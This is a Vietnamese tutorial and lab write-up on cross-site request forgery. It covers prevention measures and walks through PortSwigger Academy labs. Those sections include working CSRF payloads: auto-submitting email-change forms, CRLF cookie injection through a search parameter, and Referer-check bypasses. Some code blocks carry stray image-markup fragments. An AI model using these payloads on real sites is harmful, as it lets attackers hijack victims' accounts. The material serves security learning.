# Cross-site Request Forgery

## What is Cros-site Request Forgery ? Also known as CSRF
CSRF là một lỗ hổng web cho phép kẻ tấn công thực hiện các hành vi dựa trên người dùng, mà người dùng không nhận thức được các hành vi đó. Đây là một kỹ thuật mượn quyền trái phép.
## How to exploit CSRF ? Example
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/CSRF_lythuyet.jpg?raw=true)


Để có thể thực hiện được cuộc tấn công CSRF, cần có ba điều kiện chính:

  + Hành động liên quan: Đây là các hành động được thực hiện trong ứng dụng mà các hacker có thể sử 
  dụng làm phương tiện để tấn công. Chẳng hạn như các hành động đặc quyền (như sửa đổi quyền truy cập) 
  hay các hành động trên dữ liệu của riêng người dùng (thay đổi mật khẩu).
  
  + Xử lý dựa trên session cookie: Cụ thể, các hacker sẽ đưa ra một hay nhiều HTTP request, và ứng dụng
  chỉ dựa vào session cookie để xác định người dùng đã thực hiện request. Tức là không có cơ chế nào khác 
  để có thể theo dõi session hoặc xác thực user request.
  
  + Tham số request có thể đoán được: Các request thực hiện hành động chứa các tham số mà hacker có thể 
  xác định hay đoán được.



Các ứng dụng web hoạt động theo cơ chế nhận các câu lệnh HTTP từ người sử dụng, sau đó thực thi các câu lệnh này. Hacker sử dụng phương pháp CSRF để lừa trình duyệt của người dùng gửi đi các câu lệnh http đến các ứng dụng web. Điều đó có thể thực hiện bằng cách chèn mã độc hay link đến trang web mà người dùng đã được chứng thực. Trong trường hợp phiên làm việc của người dùng chưa hết hiệu lực thì các câu lệnh trên sẽ được thực hiện với quyền chứng thực của người sử dụng. Ta có thể xét ví dụ sau:

Người dùng Alie truy cập 1 diễn đàn yêu thích của mình như thường lệ. Một người dùng khác, Bob đăng tải 1 thông điệp lên diễn đàn. Giả sử rằng Bob có ý đồ không tốt và anh ta muốn xóa đi một dự án quan trọng nào đó mà Alice đang làm.

Bob sẽ tạo 1 bài viết, trong đó có chèn thêm 1 đoạn code như sau:
```
<img height="0" width="0" src="http://www.webapp.com/project/1/destroy">
```
Để tăng hiệu quả che dấu, đoạn mã trên có thể được thêm các thông điệp bình thường để người dùng không chú ý. Thêm vào đó thẻ img sử dụng trong trường hợp này có kích thước 0x0 pixel và người dùng sẽ không thể thấy được.

Giả sử Alie đang truy cập vào tài khoản của mình ở www.webapp.com và chưa thực hiện logout để kết thúc. Bằng việc xem bài post, trình duyệt của Alice sẽ đọc thẻ img và cố gắng load ảnh từ www.webapp.com, do đó sẽ gửi câu lệnh xóa đến địa chỉ này.

Ứng dụng web ở www.webapp.com sẽ chứng thực Alice và sẽ xóa project với ID là 1. Nó sẽ trả về trang kết quả mà không phải là ảnh, do đó trình duyệt sẽ không hiển thị ảnh.
## How to create payload for CSRF attack ??


Việc tạo HTML cho CSRF là điều cần thiết nhưng tương đối phức tạp, đặc biệt là khi request mong muốn chứa 
nhiều tham số. Cách đơn giản nhất là sử dụng trình tạo CSRF PoC được tích hợp sẵn trong Burp Suite Professional:

  + Chọn một request ở bất kỳ đâu trong Burp Site Professioanl để test hoặc exploit.

  + Click chuột phải vào context menu, chọn Engagement tools / Generate CSRF PoC.

  + Burp Suite sau đó sẽ tạo một số HTML để trigger các request đã chọn (ngoại trừ cookies – sẽ được trình 
  duyệt của nạn nhân tự động thêm vào).
  
  + Ta có thể điều chỉnh nhiều tùy chọn khác nhau trong CSRF PoC Generator nhằm chỉnh sửa một số khía cạnh 
  khác của cuộc tấn công. Đặc biệt là với các request lạ.
  
  + Copy HTML đã được tạo vào một trang web, xem nó trong trình duyệt được đăng nhập vào trang web dễ bị tấn công.
  Sau đó kiểm tra xem request dự kiến có được đưa ra thành công hay không, và xem hành động mong muốn có xảy ra không.

## Prevent CSRF
### Phía User

Để phòng tránh trở thành nạn nhân của các cuộc tấn công CSRF, người dùng internet nên thực hiện một số lưu ý sau:

  + Nên thoát khỏi các website quan trọng: Tài khoản ngân hàng, thanh toán trực tuyến, các mạng xã hội, gmail, yahoo… 
  khi đã thực hiện xong giao dịch hay các công việc cần làm. (Check - email, checkin…)
  
  + Không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, 
  phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn.
  
  + Không lưu các thông tin về mật khẩu tại trình duyệt của mình (không nên chọn các phương thức "đăng nhập lần sau", 
  "lưu mật khẩu" …
  
  + Trong quá trình thực hiện giao dịch hay vào các website quan trọng không nên vào các website khác, có thể chứa các 
  mã khai thác của kẻ tấn công.

### Phía Server

  + Sử dụng GET và POST đúng cách: Dùng GET nếu thao tác là truy vấn dữ liệu. Dùng POST nếu các thao tác tạo ra sự thay 
  đổi hệ thống.
  
  + Sử dụng captcha, các thông báo xác nhận: Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là 
  con người hay không? Các thao tác quan trọng như “đăng nhập” hay là “chuyển khoản” ,”thanh toán” thường là hay sử dụng 
  captcha. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận “bạn có muốn xóa 
  hay không” cũng làm hạn chế các kĩ thuật. Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo 
  và kết hợp với lỗi XSS.
  
  + Sử dụng token: Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo 
  ra token này sẽ nhận đối số là “SESSION” hoặc được lưu thông tin trong SESSION. Khi nhận lệnh HTTP POST về, hệ thống sẽ thực 
  hiên so khớp giá trị token này để quyết định có thực hiện hay không.
  
  + Sử dụng cookie riêng biệt cho trang quản trị: Một cookie không thể dùng chung cho các domain khác nhau,chính vì vậy việc 
  sử dụng “admin.site.com” thay vì sử dụng “site.com/admin” là an toàn hơn.
  
  + Kiểm tra REFERRER: Kiểm tra xem các câu lệnh http gửi đến hệ thống xuất phát từ đâu. Một ứng dụng web có thể hạn chế chỉ 
  thực hiện các lệnh http gửi đến từ các trang đã được chứng thực. Tuy nhiên cách làm này có nhiều hạn chế và không thật sự 
  hiệu quả.
  
  + Kiểm tra IP: Một số hệ thống quan trọng chỉ cho truy cập từ những IP được thiết lập sẵn.

## CSRF Lab

### Lab: CSRF vulnerability with no defenses
Bài lab đầu tiên khá đơn giản, nó đã mô tả cho chúng ta biết lỗ hổng khai thác nằm ở chức năng thay đổi email. Kèm theo đó là account để chúng ta login và exploit : wiener:peter

Truy cập vào bài lab chúng ta thấy 1 blog cùng chức năng login nơi mà chúng ta sẽ khai thác lỗ hổng từ chức năng change email. Hay login vào và bắt request khi change email để chúng ta có thể exploit bằng CSRF.
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_blog.jpg?raw=true)

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_updateemail.jpg?raw=true)

Hành động Update email là hành động của người dùng, tuy nhiên việc không có cơ chế bảo vệ nào đã tạo điều kiện cho hacker khai thác exploit. Chúng ta bắt request lại xem thử : 

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_request.jpg?raw=true)

Để khai thác thì chúng ta phải tạo 1 khung HTML dựa trên form như sau :
```
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>
```

Tuy nhiên điều này khá khó khăn đối với nhiều loại khai thác, vì vậy chúng ta có thể sử dụng chức năng Engagement tools / Generate CSRF PoC mà Burp Suite Professional đã hỗ trợ chúng ta như dưới đây.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_engagement.jpg?raw=true)
Chúng ta dùng payload HTML đã được Burp Suite hỗ trợ đó truy cập Exploit Server , Store để gửi payload lên trang web Deliver to Victim để exploit trang web

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_exploitserver.jpg?raw=true)

Việc chúng ta có thể exploit 1 cách dễ dàng như vậy đó là do Không có cơ chế bảo vệ cũng như là ngăn chặn nào trên website này và chúng ta đã hoàn thành bài lab.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_nodefense_solve.jpg?raw=true)





### Lab: CSRF where token validation depends on request method

Bài lab đã mô tả cho chúng ta là chức năng update email đã có 1 số biện pháp ngăn chặn nhất định, tuy nhiên vẫn có thể khai thác được. Để khai thác cũng như hoàn thành bài lab chúng ta phải sử dụng máy chủ khai thác của bạn để lưu trữ một trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.

Sau khi truy cập bài lab đăng nhập và bắt request tương tự như bài trên, chúng ta nhận thấy trong requset mà chúng ta bắt được đã có thêm cơ chế xác thực CSRF, theo như cơ chế của CSRF thì tất cả các phương thức POST sẽ đều có CSRF validate , khi chúng ta thay đổi đến email thì sẽ không thực thi được, tuy nhiên CSRF lại bỏ qua phương thức GET điều đó tạo cơ hội cho chúng ta tấn công vào request có sử dụng phương thức GET như sau:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_validation_request_get.jpg?raw=true)
Change request method để chuyển từ POST -> GET :
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_validation_request.jpg?raw=true)

Thay đổi CSRF và email sau đó tạo khung HTML bằng BurSuite hỗ trợ.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_validation_engagement.jpg?raw=true)

Sau đó truy cập exploit server và store lên website và deliver to victim để solve bài lab

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_validation_solve.jpg?raw=true)

### Lab: CSRF where token validation depends on token being present

Bài lab này tương tự bài trên, cũng đã sử dụng cơ chế CSRF để ngăn chặn hacker exploit. Tuy nhiên, cơ chế này trên 1 số trang web lại bị dính vuln. CSRF sẽ xác thực khi có giá trị, tuy nhiên nếu không có value nào CSRF thì nó sẽ bỏ qua, điều đó mở ra con đường cho chúng ta khai thác.

Kiểm tra trang web , login và bắt request để phân tích.

Chúng ta bắt được request sau đó chuyển qua repeater để check CSRF:

Như chúng ta thấy thay đổi CSRF sẽ trả về thông báo như sau:
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_changecsrf.jpg?raw=true)

Nhưng nếu chúng ta xóa luôn CSRF thì lại không bị, cho nên chúng ta sẽ tạo payload HTML từ request đã xóa CSRF. Sử dụng Engagement của Burp Suite ta được:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="![img](https://ac861f981ee8bf0c808e0b9b002200d5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="datnlq&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_exploitserver.jpg?raw=true)

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_solve.jpg?raw=true)

### CSRF token is not tied to the user session

Bài lab này đã sử dụng 1 cách khác để ngăn chặn CSRF đó là dùng tokens tuy nhiên tokens lại không được tích hợp seasion dẫn đến 1 lỗ hổng web cho chúng ta khai thác. 
Trang web đã cung cấp cho chúng ta 2 account : 

  + wiener:peter

  + carlos:montoya

Đầu tiên chúng ta login 2 tài khoản, 1 vào trang ẩn danh. Sau đó bắt 2 request của 2 acc khi sử dụng chức năng thay đổi email lại và chuyển sang repeater. 

- Wiener
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_wiener.jpg?raw=true)
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_wiener_request.jpg?raw=true)

- Carlos 
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_carlos.jpg?raw=true)
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_carlos_request.jpg?raw=true)

Sau đó chúng ta thử lấy csrf token của acc này chuyển sang acc kia và send request thì vẫn trả về kết quả. Điều đó có nghĩa là 2 token này chung 1 nhóm nên đều có thể trả về kết quả.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_carlos_changetoken.jpg?raw=true)


Vậy chúng ta sử dụng token của acc này để tạo payload HMTML để khai thác CSRF bằng acc kia thì có thể pass qua phần kiểm tra CSRF token rồi, sử dụng Burp Suite để tạo payload.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_carlos_engagement.jpg?raw=true)

Sau đó truy cập exploit server Store payload lên trang website rồi Deliver to Victim để solve bài lab

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_exploitserver.jpg?raw=true)
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_userss_solve.jpg?raw=true)


### Lab: CSRF where token is tied to non-session cookie
Bài lab mô tả rằng website đã củng cố thêm mã CSRF để ngăn chặn những cuộc tấn công, tuy nhiên mã CSRF lại không được tích hợp hoàn toàn vào seasion dẫn đến lỗ hổng cho chúng ta khai thác.

Đầu tiên chúng ta login vào 2 account và bắt lại request khi sử dụng chức năng update email lại và chuyển request vào repeater. Sau đó thay thế CSRF và CSRFKey của accout này bằng của account kia. Sau đó forward:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_requestwiener.jpg?raw=true)

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_repeatercarlos.jpg?raw=true)


Và chúng ta thấy rằng kết quả vẫn được trả về, chức năng vẫn được thực hiện đây chính là lỗ hổng mà chúng ta khai thác, chúng ta có thể dùng việc này để thay đổi CSRF của nạn nhân bằng CSRF của chúng ta. Tuy nhiên chỉ mỗi việc này là chưa đủ, chúng ta cần 1 chức năng khác của nạn nhân mà có ảnh hưởng hoặc liên quán đến cookie. Chúng ta thấy chức năng search, bắt request lại chúng ta nhận thấy rằng search sẽ có phần trả về liên kết với Set Cookie.


Điều đó thay đổi trong phần payload của chúng ta, thay vì submit.form thì bây giờ chúng ta tận dụng chức năng search:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_search.jpg?raw=true)

```
<img src="http://aca51ff61e8030e780d227cd009a0095.web-security-academy.net/
?search=halo%0d%0aSet-Cookie:%20csrfKey=7UcNABJHVZF4XzJbVtNeAxgr0J50lOLE" 
onerror="document.forms[0].submit()">
```
Sau đó chúng ta lặp lại việc thay thế CSRFkey vừa làm và tạo payload bằng Engegament và chúng ta có payload như sau:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_engagement.jpg?raw=true)
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="![img](https://aca51ff61e8030e780d227cd009a0095.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="datnlq&#64;hacker&#46;de" />
      <input type="hidden" name="csrf" value="I5C4UBLoZGT1jdFCwsq3ewWkhQdSFU5c" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="http://aca51ff61e8030e780d227cd009a0095.web-security-academy.net/?search=halo%0d%0aSet-Cookie:%20
    csrfKey=7UcNABJHVZF4XzJbVtNeAxgr0J50lOLE" onerror="document.forms[0].submit()">
  </body>
</html>

```
Đi tới exploit server và Store để send payload lên website Delver to Victim to solve.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_exploitserver.jpg?raw=true)

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_sscookie_solve.jpg?raw=true)

### Lab: CSRF where token is duplicated in cookie

Bài lab mô tả rằng lần này để ngăn chặn việc exploit CSRF thì website sử dụng "double submit" . 
Login vào account và bắt request, ta thấy được rằng có đến 2 biến csrf và thay đổi 1 trong 2 sẽ trả về kết quả như sau :

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_duplication_checkcsrf.jpg?raw=true)

Và kèm theo là chức năng search vẫn có khả năng set cookie như bài trước.
Tuy nhiên chỉ cần csrf đều giống nhau thì hoàn toàn có thể  bypass qua được loại token này.
Dựa vào đó chúng ta có thể tạo ra payload HTML bằng BurpSuite như sau: 

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_duplication_engagement.jpg?raw=true)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="![img](https://ac6e1fc01f3453d98079111f000b004d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="datnlq&#64;hacker&#46;de" />
      <input type="hidden" name="csrf" value="malware_fake" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="http://ac6e1fc01f3453d98079111f000b004d.web-security-academy.net/?search=halo%0d%0aSet-Cookie:%20csrf=malware_fake" onerror="document.forms[0].submit();"/>
  </body>
</html>
```


Sau đó đưa payload vào exploit server để Store lên website và Deliver to Victim to Solve.



### Lab: CSRF where Referer validation depends on header being present

Bài lab mô tả lỗ hổng là chức năng thay đổi email của phòng thí nghiệm này dễ bị tấn công bởi CSRF. Nó cố gắng chặn các yêu cầu tên miền chéo nhưng có một dự phòng không an toàn.

Để giải quyết phòng thí nghiệm, hãy sử dụng máy chủ khai thác của bạn để lưu trữ một trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_changecsrf.jpg?raw=true)
 Việc thay đổi csrf đã bị chặn lại và trang web đã không được trả về kết quả .
 Như vậy chúng ta chỉ việc tạo payload dựa trên request trên như sau:
 
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_engagement.jpg?raw=true)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head><meta name="referrer" content="no-referrer"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="![img](https://aca21f281f81e414809ee52500e10054.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="datnlq&#64;hacker&#46;de" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
Sau đó truy cập vào exploit server đã được cung cấp sẵn và Deliver to solve lab.

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_exploitserver.jpg?raw=true)
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_present_solve.jpg?raw=true)

### Lab: CSRF with broken Referer validation
Bài lab đã mô tả chức năng thay đổi email của phòng thí nghiệm này dễ bị tấn công bởi CSRF. Nó cố gắng phát hiện và chặn các yêu cầu tên miền chéo, nhưng cơ chế phát hiện có thể bị bỏ qua.

Để giải quyết phòng thí nghiệm, hãy sử dụng máy chủ khai thác của bạn để lưu trữ một trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Chúng ta sẽ bắt request của chức năng để xem cơ chế hoạt động của cơ chế chống CSRF. Khi chúng thay thay đổi Referer của request thì sẽ bị lỗi như sau:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_brokenvalidation_request.jpg?raw=true)
Đây chính là phần kiếm tra referer cách để ngăn chặn CSRF được đề cập đến. Tuy nhiên, vẫn có thể giải quyết được cách ngăn chặn này
Tạo payload:

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_brokenvalidation_engagement.jpg?raw=true)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?![img](https://ac101f611ffe1a9b80a9347f00cf009c.web-security-academy.net')</script>
    <form action="![img](https://ac101f611ffe1a9b80a9347f00cf009c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="datnlq&#64;hacker&#46;de" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
Sau khi có payload và Store bằng exploit server, tuy nhiên có 1 số trình duyệt sẽ gặp lỗi như sau.
Error: 
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_brokenvalidation_error.jpg?raw=true)

Điều này là do nhiều trình duyệt hiện nay loại bỏ chuỗi truy vấn khỏi tiêu đề Người giới thiệu theo mặc định như một biện pháp bảo mật. Để ghi đè hành vi này và đảm bảo rằng URL đầy đủ được bao gồm trong yêu cầu, hãy quay lại máy chủ khai thác và thêm tiêu đề sau vào phần "Head":
```
Referrer-Policy: unsafe-url
```
Sau khi thêm vào Header thì chúng ta có thể exploit và solve bài lab .
![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_brokenvalidation_exploit.jpg?raw=true)

![img](https://github.com/datnlq/Source/blob/main/Cross-site%20Request%20Forgery/image/csrf_brokenvalidation_solve.jpg?raw=true)
